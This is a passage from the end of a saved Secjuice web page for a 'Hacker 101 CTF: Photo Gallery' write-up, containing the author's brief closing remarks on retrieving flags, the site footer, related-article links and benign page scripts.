class="cm-string">'&lt;/div&gt;\n'</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 18px; width: 1px; border-bottom: 12px solid transparent; top: 50px;"></div><div class="CodeMirror-gutters" style="height: 80px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div></div></code></pre><p>And we actually get all the flags here store in the env variables:</p><figure class="kg-card kg-image-card"><img src="Hacker%20101%20CTF%20Photo%20Gallery_files/flag2_002.png" class="kg-image" alt="" loading="lazy" srcset="Hacker%20101%20CTF%20Photo%20Gallery_files/flag2_004.png 600w, Hacker%20101%20CTF%20Photo%20Gallery_files/flag2.png 1000w, Hacker%20101%20CTF%20Photo%20Gallery_files/flag2_003.png 1600w, Hacker%20101%20CTF%20Photo%20Gallery_files/flag2_002.png 1913w" sizes="(min-width: 720px) 720px" width="1913" height="133"></figure><p></p><h3 id="thoughts">Thoughts</h3><p>This
+ is my favorite challenge, I remember beating my head against a wall 
+because I didn't know much about SQL, but little by little the exploits 
+became more clear and I was able to get the flags. I had a lot of fun 
+writing that ruby script which got me to Flag 1.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="Hacker%20101%20CTF%20Photo%20Gallery_files/vaderlights-1_002.jpg" class="kg-image" alt="" loading="lazy" srcset="Hacker%20101%20CTF%20Photo%20Gallery_files/vaderlights-1_003.jpg 600w, Hacker%20101%20CTF%20Photo%20Gallery_files/vaderlights-1.jpg 1000w, Hacker%20101%20CTF%20Photo%20Gallery_files/vaderlights-1_002.jpg 1600w" sizes="(min-width: 720px) 720px" width="1600" height="1200"><figcaption>The awesome image used in this article is called Darth Vader and it was created by <a href="https://dribbble.com/Zprep" target="_blank">Nathan Owens</a>.</figcaption></figure><p></p>
+                </div>
+            </section>
+
+
+            <footer class="post-full-footer">
+
+
+                    
+<section class="author-card">
+        <img class="author-profile-image" src="Hacker%20101%20CTF%20Photo%20Gallery_files/v5jRx1JS_400x400.jpg" alt="pirateducky">
+    <section class="author-card-content">
+        <h4 class="author-card-name"><a href="https://www.secjuice.com/author/pirateducky/">pirateducky</a></h4>
+            <p>I like breaking stuff
+</p>
+    </section>
+</section>
+<div class="post-full-footer-right">
+    <a class="author-card-button" href="https://www.secjuice.com/author/pirateducky/">More articles by pirateducky</a>
+</div>
+
+
+            </footer>
+
+
+        <section><h2>Help Support Our Non-Profit Mission</h2><p>If you 
+enjoyed this article or found it helpful please consider buying us a 
+coffee, Secjuice is a non-profit and volunteer-based publication powered
+ by caffeine. We will use your coffee money to help cover our Ghost Pro <a href="https://ghost.org/pricing/">hosting costs</a> and <b>keep Secjuice an advertisement and sponsor free zone</b>.</p><iframe style="width:100%;height:75px;margin:0;" srcdoc="&lt;html&gt;&lt;body style='text-align:center'&gt;&lt;style&gt;.bmc-button img{width: 27px !important;margin-bottom: 1px !important;box-shadow: none !important;border: none !important;vertical-align: middle !important;}.bmc-button{line-height: 36px !important;height:37px !important;text-decoration: none !important;display:inline-flex !important;color:#ffffff !important;background-color:#BB5794 !important;border-radius: 3px !important;border: 1px solid transparent !important;padding: 0px 9px !important;font-size: 17px !important;letter-spacing:-0.08px !important;box-shadow: 0px 1px 2px rgba(190, 190, 190, 0.5) !important;-webkit-box-shadow: 0px 1px 2px 2px rgba(190, 190, 190, 0.5) !important;margin: 0 auto !important;font-family:'Lato', sans-serif !important;-webkit-box-sizing: border-box !important;box-sizing: border-box !important;-o-transition: 0.3s all linear !important;-webkit-transition: 0.3s all linear !important;-moz-transition: 0.3s all linear !important;-ms-transition: 0.3s all linear !important;transition: 0.3s all linear !important;}.bmc-button:hover, .bmc-button:active, .bmc-button:focus {-webkit-box-shadow: 0px 1px 2px 2px rgba(190, 190, 190, 0.5) !important;text-decoration: none !important;box-shadow: 0px 1px 2px 2px rgba(190, 190, 190, 0.5) !important;opacity: 0.85 !important;color:#ffffff !important;}&lt;/style&gt;&lt;link href='https://fonts.googleapis.com/css?family=Lato&amp;subset=latin,latin-ext' rel='stylesheet'&gt;&lt;a class='bmc-button' target='_blank' href='https://www.buymeacoffee.com/secjuice'&gt;&lt;img src='https://bmc-cdn.nyc3.digitaloceanspaces.com/BMC-button-images/BMC-btn-logo.svg' alt='Buy Secjuice A Coffee'&gt;&lt;span style='margin-left:5px'&gt;Buy Secjuice A Coffee&lt;/span&gt;&lt;/a&gt;&lt;/body&gt;&lt;/html&gt;">&lt;a href='https://www.buymeacoffee.com/secjuice'&gt;Buy Secjuice a Coffee&lt;/a&gt;</iframe></section></article>
+
+    </div>
+</main>
+
+<aside class="read-next outer">
+    <div class="inner">
+        <div class="read-next-feed">
+                <article class="read-next-card">
+                    <header class="read-next-card-header">
+                        <small class="read-next-card-header-sitetitle">— Secjuice —</small>
+                        <h3 class="read-next-card-header-title"><a href="https://www.secjuice.com/tag/technical/">TECHNICAL</a></h3>
+                    </header>
+                    <div class="read-next-divider"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 14.5s2 3 5 3 5.5-2.463 5.5-5.5S21 6.5 18 6.5c-5 0-7 11-12 11C2.962 17.5.5 15.037.5 12S3 6.5 6 6.5s4.5 3.5 4.5 3.5"></path></svg>
+</div>
+                    <div class="read-next-card-content">
+                        <ul>
+                            <li><a href="https://www.secjuice.com/htb-horizontall-walkthrough/">HTB Horizontall Walkthrough</a></li>
+                            <li><a href="https://www.secjuice.com/htb-forge-walkthrough/">HTB Forge Walkthrough</a></li>
+                            <li><a href="https://www.secjuice.com/htb-previse-walkthrough/">HTB Previse Walkthrough</a></li>
+                        </ul>
+                    </div>
+                    <footer class="read-next-card-footer">
+                        <a href="https://www.secjuice.com/tag/technical/">See all 205 posts →</a>
+                    </footer>
+                </article>
+
+                <article class="post-card post tag-technical">
+        <a class="post-card-image-link" href="https://www.secjuice.com/write-up-tryhackme-blue/">
+            <div class="post-card-image" style="background-image: url(https://www.secjuice.com/content/images/2020/08/darth_nocchio-1.jpg)"></div>
+        </a>
+    <div class="post-card-content">
+        <a class="post-card-content-link" href="https://www.secjuice.com/write-up-tryhackme-blue/">
+            <header class="post-card-header">
+                    <span class="post-card-tags">TECHNICAL</span>
+                <h2 class="post-card-title">Exploiting With Eternal Blue</h2>
+            </header>
+            <section class="post-card-excerpt">
+                <p>Learn how to exploit operating system-level vulnerabilities and gain root on the target machine with External Blue.</p>
+            </section>
+        </a>
+        <footer class="post-card-meta">
+
+            <ul class="author-list">
+                <li class="author-list-item">
+
+                    <div class="author-name-tooltip">
+                        Muhammad Luqman
+                    </div>
+
+                        <a href="https://www.secjuice.com/author/anon_7/" class="static-avatar"><img class="author-profile-image" src="Hacker%20101%20CTF%20Photo%20Gallery_files/nahel-abdul-hadi-flha0KwRrRc-unsplash.jpg" alt="Muhammad Luqman"></a>
+                </li>
+            </ul>
+
+            <span class="reading-time">6 min read</span>
+
+        </footer>
+    </div>
+</article>
+
+                <article class="post-card post tag-infosec">
+        <a class="post-card-image-link" href="https://www.secjuice.com/secjuice-squeeze-volume-34/">
+            <div class="post-card-image" style="background-image: url(https://www.secjuice.com/content/images/2020/08/hulkeye.jpg)"></div>
+        </a>
+    <div class="post-card-content">
+        <a class="post-card-content-link" href="https://www.secjuice.com/secjuice-squeeze-volume-34/">
+            <header class="post-card-header">
+                    <span class="post-card-tags">INFOSEC</span>
+                <h2 class="post-card-title">Secjuice Squeeze Volume 34</h2>
+            </header>
+            <section class="post-card-excerpt">
+                <p>Welcome to the Secjuice Squeeze, a curated selection 
+of interesting infosec articles and news that you may have missed. Now 
+with upcoming events!</p>
+            </section>
+        </a>
+        <footer class="post-card-meta">
+
+            <ul class="author-list">
+                <li class="author-list-item">
+
+                    <div class="author-name-tooltip">
+                        Secjuice
+                    </div>
+
+                        <a href="https://www.secjuice.com/author/secjuice/" class="static-avatar"><img class="author-profile-image" src="Hacker%20101%20CTF%20Photo%20Gallery_files/secjuice_icon-1.png" alt="Secjuice"></a>
+                </li>
+                <li class="author-list-item">
+
+                    <div class="author-name-tooltip">
+                        Sinwindie
+                    </div>
+
+                        <a href="https://www.secjuice.com/author/sinwindie/" class="static-avatar"><img class="author-profile-image" src="Hacker%20101%20CTF%20Photo%20Gallery_files/sinlogo.png" alt="Sinwindie"></a>
+                </li>
+                <li class="author-list-item">
+
+                    <div class="author-name-tooltip">
+                        Mike Peterson
+                    </div>
+
+                        <a href="https://www.secjuice.com/author/mike-peterson/" class="static-avatar"><img class="author-profile-image" src="Hacker%20101%20CTF%20Photo%20Gallery_files/profile.jpg" alt="Mike Peterson"></a>
+                </li>
+                <li class="author-list-item">
+
+                    <div class="author-name-tooltip">
+                        Muhammad Luqman
+                    </div>
+
+                        <a href="https://www.secjuice.com/author/anon_7/" class="static-avatar"><img class="author-profile-image" src="Hacker%20101%20CTF%20Photo%20Gallery_files/nahel-abdul-hadi-flha0KwRrRc-unsplash.jpg" alt="Muhammad Luqman"></a>
+                </li>
+                <li class="author-list-item">
+
+                    <div class="author-name-tooltip">
+                        Prasanna
+                    </div>
+
+                        <a href="https://www.secjuice.com/author/prasanna/" class="static-avatar"><img class="author-profile-image" src="Hacker%20101%20CTF%20Photo%20Gallery_files/binary.jpg" alt="Prasanna"></a>
+                </li>
+                <li class="author-list-item">
+
+                    <div class="author-name-tooltip">
+                        Miguel A. Calles MBA
+                    </div>
+
+                        <a href="https://www.secjuice.com/author/miguel-a-calles-mba/" class="static-avatar"><img class="author-profile-image" src="Hacker%20101%20CTF%20Photo%20Gallery_files/Miguel-portrait-2019-cropped-2.jpg" alt="Miguel A. Calles MBA"></a>
+                </li>
+            </ul>
+
+            <span class="reading-time">3 min read</span>
+
+        </footer>
+    </div>
+</article>
+
+        </div>
+    </div>
+</aside>
+
+<div class="floating-header">
+    <div class="floating-header-logo">
+        <a href="https://www.secjuice.com/">
+                <img src="Hacker%20101%20CTF%20Photo%20Gallery_files/secjuice_icon.png" alt="Secjuice icon">
+            <span>Secjuice</span>
+        </a>
+    </div>
+    <span class="floating-header-divider">—</span>
+    <div class="floating-header-title">Hacker 101 CTF: Photo Gallery</div>
+    <div class="floating-header-share">
+        <div class="floating-header-share-label">Share this <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+    <path d="M7.5 15.5V4a1.5 1.5 0 1 1 3 0v4.5h2a1 1 0 0 1 1 1h2a1 1 0 0 1 1 1H18a1.5 1.5 0 0 1 1.5 1.5v3.099c0 .929-.13 1.854-.385 2.748L17.5 23.5h-9c-1.5-2-5.417-8.673-5.417-8.673a1.2 1.2 0 0 1 1.76-1.605L7.5 15.5zm6-6v2m-3-3.5v3.5m6-1v2"></path>
+</svg>
+</div>
+        <a class="floating-header-share-tw" href="https://twitter.com/share?text=Hacker%20101%20CTF%3A%20Photo%20Gallery&amp;url=https://www.secjuice.com/photo-gallery/" onclick="window.open(this.href, 'share-twitter', 'width=550,height=235');return false;">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088 0 0 1-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015 0 0 1-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25 0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688 0 5.063-.875 7.188-2.5-1.25 0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5 0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673 0 0 1-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228 0 0 1-1.875-2c-.5-.875-.688-1.813-.688-2.75 0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579 0 0 1 1.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48 0 0 0 3.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z"></path></svg>
+        </a>
+        <a class="floating-header-share-fb fbc-has-badge fbc-UID_1" href="https://www.facebook.com/sharer/sharer.php?u=https://www.secjuice.com/photo-gallery/" onclick="window.open(this.href, 'share-facebook','width=580,height=296');return false;">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M19 6h5V0h-5c-3.86 0-7 3.14-7 7v3H8v6h4v16h6V16h5l1-6h-6V7c0-.542.458-1 1-1z"></path></svg>
+        </a>
+    </div>
+    <progress id="reading-progress" class="progress" value="8004" max="13332">
+        <div class="progress-container">
+            <span class="progress-bar"></span>
+        </div>
+    </progress>
+</div>
+
+
+
+
+        <footer class="site-footer outer">
+            <div class="site-footer-content inner">
+                <section class="copyright"><a href="https://www.secjuice.com/">Secjuice</a> © 2022</section>
+                <nav class="site-footer-nav">
+                    <a href="https://www.linkedin.com/company/secjuice" target="_blank" rel="noopener">Linkedin</a>
+                    <a href="https://www.facebook.com/secjuice" target="_blank" rel="noopener">Facebook</a>
+                    <a href="https://twitter.com/secjuice" target="_blank" rel="noopener">Twitter</a>
+                    <a href="https://webgap.io/" target="_blank" rel="noopener">Remote Browser Isolation</a>
+                </nav>
+            </div>
+        </footer>
+
+    </div>
+
+
+    <script src="Hacker%20101%20CTF%20Photo%20Gallery_files/jquery-3.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous">
+    </script>
+    <script type="text/javascript" src="Hacker%20101%20CTF%20Photo%20Gallery_files/jquery.js"></script>
+
+
+    <script>
+
+// NOTE: Scroll performance is poor in Safari
+// - this appears to be due to the events firing much more slowly in Safari.
+//   Dropping the scroll event and using only a raf loop results in smoother
+//   scrolling but continuous processing even when not scrolling
+$(document).ready(function () {
+    // Start fitVids
+    var $postContent = $(".post-full-content");
+    $postContent.fitVids();
+    // End fitVids
+
+    var progressBar = document.querySelector('#reading-progress');
+    var header = document.querySelector('.floating-header');
+    var title = document.querySelector('.post-full-title');
+
+    var lastScrollY = window.scrollY;
+    var lastWindowHeight = window.innerHeight;
+    var lastDocumentHeight = $(document).height();
+    var ticking = false;
+
+    function onScroll() {
+        lastScrollY = window.scrollY;
+        requestTick();
+    }
+
+    function onResize() {
+        lastWindowHeight = window.innerHeight;
+        lastDocumentHeight = $(document).height();
+        requestTick();
+    }
+
+    function requestTick() {
+        if (!ticking) {
+            requestAnimationFrame(update);
+        }
+        ticking = true;
+    }
+
+    function update() {
+        var trigger = title.getBoundingClientRect().top + window.scrollY;
+        var triggerOffset = title.offsetHeight + 35;
+        var progressMax = lastDocumentHeight - lastWindowHeight;
+
+        // show/hide floating header
+        if (lastScrollY >= trigger + triggerOffset) {
+            header.classList.add('floating-active');
+        } else {
+            header.classList.remove('floating-active');
+        }
+
+        progressBar.setAttribute('max', progressMax);
+        progressBar.setAttribute('value', lastScrollY);
+
+        ticking = false;
+    }
+
+    window.addEventListener('scroll', onScroll, {passive: true});
+    window.addEventListener('resize', onResize, false);
+
+    update();
+
+});
+</script>
+
+
+    <script src="Hacker%20101%20CTF%20Photo%20Gallery_files/prism.js"></script>
+<script src="Hacker%20101%20CTF%20Photo%20Gallery_files/prism-line-numbers.js"></script>
+<link rel="stylesheet" type="text/css" href="Hacker%20101%20CTF%20Photo%20Gallery_files/prism.css">
+<link rel="stylesheet" type="text/css" href="Hacker%20101%20CTF%20Photo%20Gallery_files/prism-line-numbers.css">
+<link rel="stylesheet" type="text/css" href="Hacker%20101%20CTF%20Photo%20Gallery_files/prism-coy.css">
+
+<script src="Hacker%20101%20CTF%20Photo%20Gallery_files/prism-csharp.js"></script>
+<script src="Hacker%20101%20CTF%20Photo%20Gallery_files/prism-css.js"></script>
+<script src="Hacker%20101%20CTF%20Photo%20Gallery_files/prism-c.js"></script>
+<script src="Hacker%20101%20CTF%20Photo%20Gallery_files/prism-clike.js"></script>
+
+<script>
+$(document).ready(function() {
+    // comment out this for testing w/o codemirrror
+    /* if(location.href == '') {
+        return true;
+    }*/
+    
+    $('iframe').each(function() {
+    	console.log($(this).attr('src'));
+    });
+    
+    $(document).ready(function() {
+    	$('.post-full-content a').each(function() {
+            if(!/^\#/.test($(this).attr('href'))) {
+        		$(this).attr('target','_blank');
+        	}
+        });
+    });
+    
+    $('code[class]').each(function() {
+
+        // get code text and flush
+    	var $this = $(this), $code = $.trim($this.text());
+    	$this.empty();
+        
+        // parse language and theme
+        var mode = 'htmlmixed';
+        var theme = 'monokai';
+        var numLines = $code.split('\n').length;
+        var maxNumLinesShown = 50;
+        var lineHeight = 25;
+        var codeheight = (numLines > maxNumLinesShown ? maxNumLinesShown : numLines.length) * lineHeight;
+        if(/^language\-[^\-]+\-.+$/.test($.trim($(this).attr('class')))) {
+			langclass = /^language\-([^\-]+)\-(.+)$/.exec($.trim($(this).attr('class')));
+			mode = langclass[1];
+            if(/([^\_]+)\_([0-9]+)/.test(langclass[2])) {
+                themeheight = /([^\_]+)\_([0-9]+)/.exec(langclass[2]);
+				theme = themeheight[1];
+                codeheight = themeheight[2];
+            } else {
+            	theme = langclass[2];
+            }
+            
+            if(mode == 'c') { mode = 'text/x-csrc'; }
+            if(mode == 'cpp') { mode = 'text/x-c++src'; }
+
+            console.log('mode:'+mode+' theme:'+theme);
+        } else if(/^language\-[^\-]+$/.test($.trim($(this).attr('class')))) {
+			langclass = /^language\-([^\-]+)$/.exec($.trim($(this).attr('class')));
+			mode = langclass[1];
+			theme = 'default';
+            
+            if(mode == 'c') { mode = 'text/x-csrc'; }
+            if(mode == 'cpp') { mode = 'text/x-c++src'; }
+            
+            console.log('mode:'+mode+' default-theme:'+theme);            
+        } else {
+            mode = 'htmlmixed';
+            theme = 'default';
+        	console.log('code class not recognized: '+$(this).attr('class'));
+        }
+        
+        $(this).removeAttr('class');
+
+    	var myCodeMirror = CodeMirror(this, {
+        	value: $code,
+			mode: mode,
+			theme: theme,
+			indent: false,
+			lineNumbers: true,
+        	readOnly: true
+    	});
+        
+        myCodeMirror.setSize(null, codeheight);
+        $(this).focus();
+	});
+
+	$('pre').each(function() {
+        $(this).css('background-color','transparent');
+        $(this).css('border','none');
+        $(this).css('padding','0px');
+        $(this).css('padding-left','10px');
+        $(this).css('margin','0px');
+        $(this).removeAttr('class');
+    });
+    
+    /* $(".post-full-meta").css(
+		"font-family",
+        "secjuice-title"
+    );
+    
+    $(".post-full-title").css(
+		"font-family",
+        "secjuice-title"
+    );
+    
+    $(".post-full-content").css(
+		"font-family",
+        "secjuice-content"
+    );
+    
+    $(".author-card-content").css(
+		"font-family",
+        "secjuice-content"
+    );
+    
+    $(".floating-header").css(
+        {
+          "font-family":"secjuice-content",
+          "font-weight":"normal"
+        }
+    ); */
+});
+</script>
+
+<script>
+    $(document).ready(function() {
+        beforeCoffee = "<section><h2>Help Support Our Non-Profit Mission</h2><p>If you enjoyed this article or found it helpful please consider buying us a coffee, Secjuice is a non-profit and volunteer-based publication powered by caffeine. We will use your coffee money to help cover our Ghost Pro <a href='https://ghost.org/pricing/'>hosting costs</a> and <b>keep Secjuice an advertisement and sponsor free zone</b>.</p>";
+        coffee = "<iframe style='width:100%;height:75px;margin:0;' srcdoc=\"<html><body style='text-align:center'><style>.bmc-button img{width: 27px !important;margin-bottom: 1px !important;box-shadow: none !important;border: none !important;vertical-align: middle !important;}.bmc-button{line-height: 36px !important;height:37px !important;text-decoration: none !important;display:inline-flex !important;color:#ffffff !important;background-color:#BB5794 !important;border-radius: 3px !important;border: 1px solid transparent !important;padding: 0px 9px !important;font-size: 17px !important;letter-spacing:-0.08px !important;box-shadow: 0px 1px 2px rgba(190, 190, 190, 0.5) !important;-webkit-box-shadow: 0px 1px 2px 2px rgba(190, 190, 190, 0.5) !important;margin: 0 auto !important;font-family:'Lato', sans-serif !important;-webkit-box-sizing: border-box !important;box-sizing: border-box !important;-o-transition: 0.3s all linear !important;-webkit-transition: 0.3s all linear !important;-moz-transition: 0.3s all linear !important;-ms-transition: 0.3s all linear !important;transition: 0.3s all linear !important;}.bmc-button:hover, .bmc-button:active, .bmc-button:focus {-webkit-box-shadow: 0px 1px 2px 2px rgba(190, 190, 190, 0.5) !important;text-decoration: none !important;box-shadow: 0px 1px 2px 2px rgba(190, 190, 190, 0.5) !important;opacity: 0.85 !important;color:#ffffff !important;}</style><link href='https://fonts.googleapis.com/css?family=Lato&subset=latin,latin-ext' rel='stylesheet'><a class='bmc-button' target='_blank' href='https://www.buymeacoffee.com/secjuice'><img src='https://bmc-cdn.nyc3.digitaloceanspaces.com/BMC-button-images/BMC-btn-logo.svg' alt='Buy Secjuice A Coffee'><span style='margin-left:5px'>Buy Secjuice A Coffee</span></a></body></html>\"><a href='https://www.buymeacoffee.com/secjuice'>Buy Secjuice a Coffee</a></iframe>";
+        afterCoffee = "</section>";
+        document.getElementsByClassName('post-full')[0].innerHTML += beforeCoffee + coffee + afterCoffee;
+    })
+</script>
+
+
+
+<div class="fbc-badge js-fbc-UID_1 fbc-badge-small fbc-badge-disabled fbc-badge-share-passive fbc-badge-share"><div class="fbc-badge-fence"></div><div class="fbc-badge-tooltip">If you click this button, Facebook will be able to track your visit to this site.</div><div class="fbc-badge-prompt"></div></div></body></html>
